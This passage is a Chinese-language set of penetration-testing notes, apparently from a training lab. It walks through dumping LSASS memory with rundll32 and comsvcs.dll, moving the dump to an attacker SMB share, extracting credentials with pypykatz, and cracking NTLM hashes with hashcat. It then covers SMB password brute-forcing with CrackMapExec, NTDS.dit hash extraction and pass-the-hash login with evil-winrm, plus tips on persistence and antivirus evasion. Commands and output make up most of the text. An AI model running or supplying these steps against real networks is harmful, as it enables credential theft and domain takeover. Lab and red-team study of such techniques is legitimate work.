**方法二：命令列方式（無 GUI 時使用）**

```powershell
# 找到 lsass 的 PID
Get-Process lsass (Testing command)

# 建立轉儲檔案（需管理員權限）
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

***

#### 三、步驟二：將檔案傳送回攻擊端

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support\n\n
```

```
move C:\lsass.dmp \\10.10.14.234\share
```



可用工具與方法：

* Python HTTP server + Invoke-WebRequest
* impacket-smbserver + copy 命令
* scp / netcat

***

#### 四、步驟三：使用 pypykatz 進行憑證分析

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```

輸出結果將會包含以下欄位：

* **MSV**：含 NTLM 密碼雜湊
* **WDIGEST**：若存在明文密碼將顯示在此（Windows 8 前預設啟用）
* **Kerberos**：可用於 Pass-the-Ticket
* **DPAPI**：提取 masterkey 用於後續憑證解密

```
== LogonSession ==                                                                                                   
authentication_id 124587 (1e6ab)                                                                                     
session_id 0                                                                                                         
username Vendor                                                                                                      
domainname FS01                                                                                                      
logon_server FS01                                                                                                    
logon_time 2025-03-28T02:06:00.550450+00:00                                                                          
sid S-1-5-21-2288469977-2371064354-2971934342-1003                                                                   
luid 124587                                                                                                          
        == MSV ==                                                                                                    
                Username: Vendor                                                                                     
                Domain: FS01                                                                                         
                LM: NA                                                                                               
                NT: 31f87811133bc6aaa75a536e77f64314     (that is send to hashcat of hash)                                                             
                SHA1: 2b1c560c35923a8936263770a047764d0422caba                                                       
                DPAPI: NA                                                                                            
        == WDIGEST [1e6ab]==                                                                                         
                username Vendor                                                                                      
                domainname FS01                                                                                      
                password None                                                                                        
                password (hex)                                                                                       
        == Kerberos ==                                                                                               
                Username: Vendor                                                                                     
                Domain: FS01                                                                                         
        == WDIGEST [1e6ab]==                                                                                         
                username Vendor                                                                                      
                domainname FS01                                                                                      
                password None                                                                                        
                password (hex)                                                                                       
                                                                                                                     
== LogonSession ==                 
```



***

#### 五、步驟四：使用 Hashcat 破解 NTLM Hash

```bash
sudo hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt
```

範例：

```bash
64f12cddaa88057e06a81b54e73b949b:Password1
```

***

#### 六、小總結 & 延伸方向

你已學會：

* 如何轉儲 LSASS 記憶體
* 如何離線分析並提取憑證
* 如何用 hashcat 破解密碼雜湊

可延伸學習方向：

* AV 繞過（rundll32 或 procdump 偽裝）
* Mimikatz 與 pass-the-hash / pass-the-ticket
* Kerberos Delegation / Resource-based delegation
* DPAPI 解密技巧

***

#### 七、滲透流程樹狀圖

```
[存取目標主機]
 ├── GUI桌面 → 任務管理員轉儲
 └── 命令列權限 → rundll32 / procdump

    ↓

[取得 lsass.dmp]
 └── 將轉儲檔案上傳回攻擊主機

    ↓

[離線分析]
 └── pypykatz lsa minidump lsass.dmp

    ↓

[雜湊破解]
 └── hashcat 破解 NTLM / 驗證明文密碼

    ↓

[後續利用]
 ├── 橫向移動（RDP、SMB、WMI）
 ├── 特權提升
 └── Kerberos 票證利用
```

</details>

<details>

<summary>SMB 密碼爆破結合 NTDS.dit 提取與 Pass-the-Hash 域控滲透攻擊</summary>

***

對於已經知道的名稱  通過SMB進行爆破 然後取得hash 使用admin hash  登入

#### 密通過SMB碼爆破階段（Dictionary Attack）

*   使用 CrackMapExec 嘗試針對社工得知帳號進行密碼字典爆破：

    ```bash
    crackmapexec smb <IP> -u jmarston -p /usr/share/wordlists/fasttrack.txt
    ```
*   成功示例輸出：

    ```
    [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
    ```

***

#### 3. 權限確認

*   檢查該帳號是否具有提取 NTDS 的權限：

    ```bash
    crackmapexec smb <IP> -u jmarston -p 'P@ssword!' --local-auth
    ```

***

#### 4. 匯出 NTDS.dit Hash

*   使用 CrackMapExec 一鍵提取所有使用者 NTLM hash：

    ```bash
    crackmapexec smb <IP> -u jmarston -p 'P@ssword!' --ntds
    ```
*   找到 Administrator hash：

    ```
    Administrator:500:aad3...:64f12cddaa88057e06a81b54e73b949b:::
    ```

***

#### 5. 破解特定帳號 Hash

*   使用 hashcat 嘗試破解 Jennifer Stapleton 的 hash：

    ```bash
    hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt
    ```
*   破解成功結果：

    ```
    92fd67fd2f49d0e83744aa82363f021b:Winter2008
    ```

***

#### 6. 使用 Pass-the-Hash 取得 Administrator 權限

*   使用已知 hash 不需要明文密碼登入：

    ```bash
    evil-winrm -i <target_ip> -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
    ```

***

#### 7. 橫向滲透與提權建議

* 使用 Mimikatz 提取記憶體中的密碼或 Kerberos 票據。
* 嘗試 Kerberoasting 或 DCSync 攻擊。
* 建立隱藏帳號或修改 GPO 以維持存取。

***

#### 8. Debug 流程對照表

| 問題                  | 解法                    |
| ------------------- | --------------------- |
| CrackMapExec 無法爆破成功 | 確認帳號格式、換更大字典          |
| 無法抓取 NTDS           | 帳號權限不足、需提權            |
| Hashcat 無法破解        | 使用更大字典、使用 rules 模式    |
| evil-winrm 無法登入     | 確認開啟 WinRM，確認 hash 無誤 |

***

此流程可作為進攻 AD 的基礎腳本與分析手冊，也可以進一步自動化整合為 red team 工具。

</details>

